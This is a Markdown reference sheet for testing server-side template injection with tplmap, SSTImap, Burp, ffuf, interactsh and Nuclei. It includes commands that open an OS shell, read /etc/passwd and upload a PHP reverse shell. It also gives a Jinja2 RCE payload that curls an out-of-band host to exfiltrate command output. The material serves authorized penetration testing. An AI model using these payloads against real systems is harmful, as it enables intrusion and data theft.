# SSTI Tools Reference

---

## tplmap

Automated SSTI detection and exploitation. The go-to tool for SSTI, similar to sqlmap.

**Install:**
```bash
git clone https://github.com/epinna/tplmap
cd tplmap
pip install -r requirements.txt
```

**Basic scan:**
```bash
python tplmap.py -u "http://target.com/page?name=INJECT"
```

**With POST data:**
```bash
python tplmap.py -u "http://target.com/page" -d "name=INJECT"
```

**With cookies:**
```bash
python tplmap.py -u "http://target.com/page?name=INJECT" --cookie "session=abc123"
```

**OS shell:**
```bash
python tplmap.py -u "http://target.com/page?name=INJECT" --os-shell
```

**File read:**
```bash
python tplmap.py -u "http://target.com/page?name=INJECT" --os-cmd "cat /etc/passwd"
```

**Upload reverse shell:**
```bash
python tplmap.py -u "http://target.com/page?name=INJECT" --upload /tmp/shell.php /var/www/html/shell.php
```

**Specify engine (skip fingerprinting):**
```bash
python tplmap.py -u "http://target.com/page?name=INJECT" --engine Jinja2
```

**Supported engines:** Jinja2, Twig, Smarty, Mako, FreeMarker, Velocity, Pebble, ERB, EJS, Jade, Handlebars

---

## SSTImap

More actively maintained successor to tplmap.

**Install:**
```bash
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip install -r requirements.txt
```

**Basic scan:**
```bash
python sstimap.py -u "http://target.com/page?name=INJECT"
```

**Interactive shell:**
```bash
python sstimap.py -u "http://target.com/page?name=INJECT" --os-shell
```

**Crawl and test all parameters:**
```bash
python sstimap.py -u "http://target.com/page" --crawl
```

---

## Burp Suite — Extensions

### Tplmap Burp Extension
Integrates tplmap directly into Burp's active scanner. Right-click any request → Extensions → tplmap.

### SSTI Scanner (BApp Store)
Passive/active scanner for SSTI in all parameters. Install from BApp Store: `Burp Suite → Extensions → BApp Store → SSTI Scanner`

### Usage with Burp Repeater (manual):
1. Identify the reflected parameter in Repeater
2. Replace the value with `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` in sequence
3. Check if the response contains `49`
4. Escalate with engine-specific RCE payload

---

## ffuf — Parameter Discovery

Before testing, discover hidden parameters that may reflect input:

```bash
# Fuzz query parameters
ffuf -u "http://target.com/page?FUZZ=test" -w /usr/share/wordlists/burp-parameter-names.txt -mc 200

# Fuzz POST parameters
ffuf -u "http://target.com/page" -X POST -d "FUZZ=test" -w /usr/share/wordlists/burp-parameter-names.txt -mc 200

# Find reflection: look for "test" in responses
ffuf -u "http://target.com/page?name=FUZZ" -w probe_strings.txt -mr "FUZZ"
```

---

## Burp Collaborator / interactsh — OOB Detection

For blind SSTI where output is not reflected.

**interactsh (open-source Collaborator alternative):**
```bash
# Install
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Start listener (gives you a URL like xyz.oast.me)
interactsh-client

# Use URL in payload:
{{config.__class__.__init__.__globals__['os'].popen('curl http://xyz.oast.me/?x=$(id|base64)').read()}}
```

**Burp Collaborator:**
- Burp → Burp Collaborator client → Copy to clipboard
- Paste URL into your blind SSTI payload
- Poll for interactions after sending

---

## Nuclei — Template-Based Scanning

Community-maintained SSTI detection templates:

```bash
# Install
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Run SSTI templates against a target
nuclei -u http://target.com -t fuzzing/ssti/ -v

# Run with a list of URLs
nuclei -l urls.txt -t fuzzing/ssti/ -v
```

---

## Manual Recon Helpers

**Identify tech stack (which engine to expect):**
```bash
# Check response headers
curl -s -I http://target.com | grep -i "x-powered-by\|server\|x-framework\|x-runtime"

# Wappalyzer CLI
npx wappalyzer http://target.com

# whatweb
whatweb http://target.com
```

**Find parameters that reflect input:**
```bash
# Use gau + grep to find reflected params in JS/HTML
gau http://target.com | grep "="
```

**Check for SSTI in Wayback Machine URLs:**
```bash
# Fetch all historical URLs with parameters
waybackurls target.com | grep "=" | sort -u
```
